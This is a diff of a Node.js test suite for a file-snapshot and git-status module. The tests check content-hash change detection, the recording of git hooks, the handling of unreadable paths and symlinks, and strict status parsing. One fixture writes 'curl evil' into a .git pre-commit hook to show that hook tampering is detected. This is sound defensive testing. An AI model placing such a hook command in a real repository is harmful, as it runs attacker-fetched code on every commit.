@@ -402,48 +402,136 @@ test('deleteMergedBranch refuses an unmerged branch and deletes a merged one', (
 });
 
 // 9 ------------------------------------------------------------------------
-test('snapshot and diffSnapshot detect added, changed and removed files without git', () => {
+test('snapshot and diffSnapshot detect added, changed and removed files by content hash', () => {
   const dir = tmpRoot();
   write(dir, 'keep.txt', 'keep');
   write(dir, 'change.txt', 'old');
   write(dir, 'gone.txt', 'gone');
   write(dir, 'sub/inner.txt', 'inner');
   const before = G.snapshot(dir);
-  assert.deepEqual(Object.keys(before).sort(), ['change.txt', 'gone.txt', 'keep.txt', 'sub/inner.txt']);
-  assert.match(before['keep.txt'], /^\d+:[\d.]+$/);
+  assert.equal(before.version, 2);
+  assert.equal(before.complete, true);
+  assert.deepEqual(before.errors, []);
+  assert.deepEqual(Object.keys(before.files).sort(), ['change.txt', 'gone.txt', 'keep.txt', 'sub/inner.txt']);
+  assert.equal(before.files['keep.txt'], `sha256:${require('node:crypto').createHash('sha256').update('keep').digest('hex')}`);
 
-  write(dir, 'change.txt', 'a longer replacement');
+  const oldStat = fs.statSync(path.join(dir, 'change.txt'));
+  write(dir, 'change.txt', 'new'); // same size ...
+  fs.utimesSync(path.join(dir, 'change.txt'), oldStat.atime, oldStat.mtime); // ... and the old mtime restored
   fs.rmSync(path.join(dir, 'gone.txt'));
   write(dir, 'added.txt', 'new');
   write(dir, 'sub/deeper/added2.txt', 'new');
   const after = G.snapshot(dir);
+  const c = G.compareSnapshots(before, after);
+  assert.equal(c.ok, true);
+  assert.deepEqual(c.added, ['added.txt', 'sub/deeper/added2.txt']);
+  assert.deepEqual(c.modified, ['change.txt'], 'a same-size change with the old mtime is still detected');
+  assert.deepEqual(c.deleted, ['gone.txt']);
   assert.deepEqual(G.diffSnapshot(before, after), ['added.txt', 'change.txt', 'gone.txt', 'sub/deeper/added2.txt']);
   assert.deepEqual(G.diffSnapshot(after, after), []);
 });
 
-test('snapshot skips the default ignored directories and honours a custom ignore list', () => {
+test('snapshot skips the default ignored directories, records only the config and hooks of .git, and honours a custom ignore list', () => {
   const dir = tmpRoot();
   write(dir, 'src/a.js', 'a');
   write(dir, '.git/HEAD', 'ref');
+  write(dir, '.git/config', '[core]\n');
+  write(dir, '.git/hooks/pre-commit', '#!/bin/sh\n');
   write(dir, 'node_modules/pkg/index.js', 'x');
   write(dir, 'src/node_modules/pkg/index.js', 'x');
   write(dir, '.claude/opus-orchestrator/runs/r/run.json', '{}');
   write(dir, '.claude/settings.json', '{}');
   write(dir, '.opus-inbox/msg.md', 'm');
   const snap = G.snapshot(dir);
-  assert.deepEqual(Object.keys(snap).sort(), ['.claude/settings.json', 'src/a.js']);
+  assert.deepEqual(Object.keys(snap.files).sort(), ['.claude/settings.json', '.git/config', '.git/hooks/pre-commit', 'src/a.js']);
 
   const custom = G.snapshot(dir, { ignore: ['src'] });
-  assert.equal('src/a.js' in custom, false);
-  assert.equal('.git/HEAD' in custom, true);
+  assert.equal('src/a.js' in custom.files, false);
+  assert.equal('.git/HEAD' in custom.files, false);
+  assert.equal('.git/hooks/pre-commit' in custom.files, true);
 
-  // changes inside ignored directories do not show up in a diff
+  // changes inside ignored directories do not show up in a diff; a changed hook does
   const before = G.snapshot(dir);
   write(dir, '.git/index', 'z');
   write(dir, 'node_modules/new.js', 'z');
   assert.deepEqual(G.diffSnapshot(before, G.snapshot(dir)), []);
+  write(dir, '.git/hooks/pre-commit', '#!/bin/sh\ncurl evil\n');
+  assert.deepEqual(G.diffSnapshot(before, G.snapshot(dir)), ['.git/hooks/pre-commit']);
 });
 
-test('snapshot of a missing directory is empty', () => {
-  assert.deepEqual(G.snapshot(path.join(tmpRoot(), 'nope')), {});
+test('regression: a missing root, an unreadable directory or file and an old-format snapshot are incomplete evidence, never "no change"', () => {
+  const missing = G.snapshot(path.join(tmpRoot(), 'nope'));
+  assert.equal(missing.complete, false);
+  assert.deepEqual(missing.errors, [{ path: '.', code: 'ROOT_MISSING' }]);
+  assert.deepEqual(missing.files, {});
+
+  const dir = tmpRoot();
+  write(dir, 'ok.txt', 'ok');
+  write(dir, 'locked/secret.txt', 's');
+  write(dir, 'denied.txt', 'd');
+  const good = G.snapshot(dir);
+  // Fault injection: the directory and the file cannot be read.
+  const realReaddir = fs.readdirSync;
+  const realOpen = fs.openSync;
+  fs.readdirSync = function patched(p, ...rest) {
+    if (path.resolve(String(p)) === path.join(dir, 'locked')) { const e = new Error('EACCES: permission denied'); e.code = 'EACCES'; throw e; }
+    return realReaddir.call(fs, p, ...rest);
+  };
+  fs.openSync = function patched(p, ...rest) {
+    if (path.resolve(String(p)) === path.join(dir, 'denied.txt')) { const e = new Error('EPERM: operation not permitted'); e.code = 'EPERM'; throw e; }
+    return realOpen.call(fs, p, ...rest);
+  };
+  let bad;
+  try {
+    bad = G.snapshot(dir);
+  } finally {
+    fs.readdirSync = realReaddir;
+    fs.openSync = realOpen;
+  }
+  assert.equal(bad.complete, false);
+  assert.deepEqual(bad.errors.sort((a, b) => a.path.localeCompare(b.path)), [{ path: 'denied.txt', code: 'EPERM' }, { path: 'locked', code: 'EACCES' }]);
+  const cmp = G.compareSnapshots(good, bad);
+  assert.equal(cmp.ok, false);
+  assert.match(cmp.problems[0], /the current snapshot is incomplete: .*locked \(EACCES\)/);
+  assert.throws(() => G.diffSnapshot(good, bad), (e) => e.code === 'SNAPSHOT_INCOMPLETE');
+  assert.throws(() => G.diffSnapshot({ 'ok.txt': '2:123' }, good), /old format/, 'a size:mtime snapshot of 1.0.0 is not accepted as evidence');
+  assert.equal(G.compareSnapshots(missing, missing).ok, false);
+});
+
+test('snapshot records a symbolic link or junction without following it', () => {
+  const dir = tmpRoot();
+  const outside = tmpRoot();
+  write(outside, 'outside.txt', 'not part of the project');
+  write(dir, 'real.txt', 'r');
+  fs.symlinkSync(outside, path.join(dir, 'linkdir'), 'junction');
+  const s = G.snapshot(dir);
+  assert.equal(s.complete, true);
+  assert.match(s.files.linkdir, /^link:/);
+  assert.equal(Object.keys(s.files).some((k) => k.startsWith('linkdir/')), false, 'the link target is not walked');
+  // retargeting the link is a change
+  const other = tmpRoot();
+  fs.unlinkSync(path.join(dir, 'linkdir'));
+  fs.symlinkSync(other, path.join(dir, 'linkdir'), 'junction');
+  assert.deepEqual(G.diffSnapshot(s, G.snapshot(dir)), ['linkdir']);
+});
+
+test('snapshot marks names that a scope cannot match reliably', { skip: process.platform === 'win32' ? 'Windows file names cannot contain backslashes or control characters' : false }, () => {
+  const dir = tmpRoot();
+  write(dir, 'plain.txt', 'p');
+  fs.writeFileSync(path.join(dir, 'a\\b.txt'), 'x');
+  fs.writeFileSync(path.join(dir, 'new\nline.txt'), 'y');
+  const s = G.snapshot(dir);
+  assert.deepEqual(s.odd, ['a\\b.txt', 'new\nline.txt']);
+  assert.equal(s.complete, true);
+});
+
+test('strict git status: malformed or truncated output and an unreadable work tree raise instead of reading as clean', () => {
+  assert.deepEqual(G.parseStatusZ(''), []);
+  assert.deepEqual(G.parseStatusZ(' M a.txt\0R  new.txt\0old.txt\0?? u.txt\0'), [
+    { x: ' ', y: 'M', path: 'a.txt', orig: null }, { x: 'R', y: ' ', path: 'new.txt', orig: 'old.txt' }, { x: '?', y: '?', path: 'u.txt', orig: null }]);
+  for (const bad of ['garbage', ' M a.txt', 'XY a.txt\0', 'R  new.txt\0', ' M\0', '   x\0']) {
+    assert.throws(() => G.parseStatusZ(bad), (e) => e.code === 'STATUS_MALFORMED', JSON.stringify(bad));
+  }
+  assert.throws(() => G.statusEntries(path.join(tmpRoot(), 'missing')), (e) => e.code === 'STATUS_FAILED');
+  assert.throws(() => G.statusEntries(tmpRoot()), (e) => e.code === 'STATUS_FAILED' && /git status failed/.test(e.message), 'a directory that is not a work tree');
 });
